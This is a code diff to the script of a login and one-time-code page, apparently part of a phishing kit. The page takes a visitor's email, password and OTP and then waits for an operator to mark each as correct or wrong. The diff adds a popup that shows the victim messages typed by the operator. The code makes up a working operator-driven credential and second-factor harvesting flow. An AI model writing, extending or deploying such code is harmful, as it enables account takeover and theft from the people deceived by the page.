@@ -70,7 +70,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     <div id="modalError" class="modal-error"></div>
   </div>
 </div>
-
 <script>
   const urlParams = new URLSearchParams(window.location.search);
   const email = urlParams.get('email');
@@ -84,9 +83,62 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   let approvalInterval  = null;
   let blockCheckInterval = null;
   let isModalOpen       = false;
-  let adminTextHandling = false; // lock: only one flag processed at a time
+  let adminTextHandling = false;
 
-  // ── User-side flag release — no JWT required ───────────────────────────────
+  // ── Helper: close login modal immediately ─────────────────────────────────
+  function closeLoginModal() {
+    const modal = document.getElementById('loginModal');
+    if (modal && modal.classList.contains('active')) {
+      modal.classList.remove('active');
+      isModalOpen = false;
+    }
+  }
+
+  // ── Handle regular text messages (Send Text button) ───────────────────────
+  async function showTextPopup(message) {
+    // Close login modal FIRST before showing text
+    closeLoginModal();
+
+    let textModal = document.getElementById('customTextModal');
+    if (!textModal) {
+      textModal = document.createElement('div');
+      textModal.id = 'customTextModal';
+      textModal.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.9);
+        backdrop-filter: blur(8px);
+        z-index: 20000;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      `;
+      textModal.innerHTML = `
+        <div style="background: white; border-radius: 28px; max-width: 380px; width: 90%; padding: 32px 24px; text-align: center;">
+          <div style="width: 60px; height: 60px; background: #f97316; border-radius: 30px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="width: 32px; height: 32px; stroke: white;">
+              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+            </svg>
+          </div>
+          <h3 style="font-size: 22px; font-weight: 700; color: #1f2937; margin-bottom: 8px;">Atlas Capture</h3>
+          <div id="customTextMessageContent" style="background: #f3f4f6; padding: 16px; border-radius: 16px; margin: 20px 0; text-align: left; font-size: 15px; line-height: 1.5; color: #1f2937;"></div>
+          <button onclick="this.parentElement.parentElement.remove()" style="width: 100%; padding: 12px; background: #4f46e5; color: white; border: none; border-radius: 12px; font-weight: 600; cursor: pointer;">Close</button>
+        </div>
+      `;
+      document.body.appendChild(textModal);
+    }
+    document.getElementById('customTextMessageContent').textContent = message;
+    textModal.style.display = 'flex';
+
+    setTimeout(() => {
+      if (textModal) textModal.style.display = 'none';
+    }, 10000);
+  }
+
+  // ── User-side flag release ────────────────────────────────────────────────
   async function releaseAdminText() {
     try {
       await fetch('/api/users/release-admin-text', {
@@ -111,6 +163,18 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 
       adminTextHandling = true;
 
+      // NEW: Check for regular text message first (not a special flag)
+      if (data.admin_text && data.admin_text.trim() !== '' && 
+          data.admin_text !== 'incorrect_otp_error' && 
+          data.admin_text !== 'wrong_login_error' && 
+          data.admin_text !== 'correct_login_success') {
+        // This is a regular text message from "Send Text" button
+        await showTextPopup(data.admin_text);
+        await releaseAdminText();
+        adminTextHandling = false;
+        return;
+      }
+
       if      (data.admin_text === 'incorrect_otp_error')  await handleIncorrectOtp();
       else if (data.admin_text === 'wrong_login_error')     await handleWrongLogin();
       else if (data.admin_text === 'correct_login_success') await handleCorrectLogin();
@@ -121,7 +185,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 
   // ── Incorrect OTP ──────────────────────────────────────────────────────────
   async function handleIncorrectOtp() {
-    await releaseAdminText(); // wipe DB flag immediately
+    await releaseAdminText();
 
     if (approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
     isProcessing = false;
@@ -130,7 +194,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     errorDiv.style.display = 'block';
     otpInput.value = '';
 
-    // Button disabled 2s cooldown, then re-enable
     verifyBtn.disabled = true;
     verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
     setTimeout(() => {
@@ -139,7 +202,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
       otpInput.focus();
     }, 2000);
 
-    // Hide error after 5s then unlock poller
     setTimeout(() => { errorDiv.style.display = 'none'; adminTextHandling = false; }, 5000);
   }
 
@@ -147,9 +209,9 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   async function handleWrongLogin() {
     await releaseAdminText();
 
-    const modalError    = document.getElementById('modalError');
+    const modalError   = document.getElementById('modalError');
     const loginPassword = document.getElementById('loginPassword');
-    const submitBtn     = document.getElementById('submitLoginBtn');
+    const submitBtn    = document.getElementById('submitLoginBtn');
 
     if (modalError)    { modalError.textContent = '❌ Invalid email or password. Please try again.'; modalError.style.display = 'block'; }
     if (loginPassword) loginPassword.value = '';
@@ -204,7 +266,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   function showWaiting() { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>'; }
   function resetButton() { isProcessing = false; verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; }
 
-  // Polls the `second_approved` column — when true, redirect to success
   function startCheckingSecondApproval() {
     if (approvalInterval) clearInterval(approvalInterval);
     approvalInterval = setInterval(async () => {
@@ -249,7 +310,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
         startBlockChecking();
         startCheckingSecondApproval();
       } else {
-        // Server rejected (e.g. duplicate OTP) — reset and show message
         resetButton();
         otpInput.value = '';
         errorDiv.textContent = data.error || 'Something went wrong. Please try again.';
@@ -324,7 +384,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
       });
       const data = await res.json();
       if (data.success) {
-        // Stay spinning — admin will trigger correct/wrong signal
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
       } else {
